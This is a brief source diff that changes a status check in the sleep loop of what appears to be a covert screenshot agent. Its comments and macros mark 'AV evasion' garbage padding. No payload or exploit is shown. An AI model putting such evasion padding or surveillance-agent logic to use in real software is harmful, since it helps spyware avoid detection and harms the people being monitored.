@@ -338,7 +338,7 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
+    while (![[mAgentConfiguration objectForKey: @"status"] isEqual: AGENT_STOPPED]
          && internalCounter <= mSleepSec)
   {
     internalCounter++;
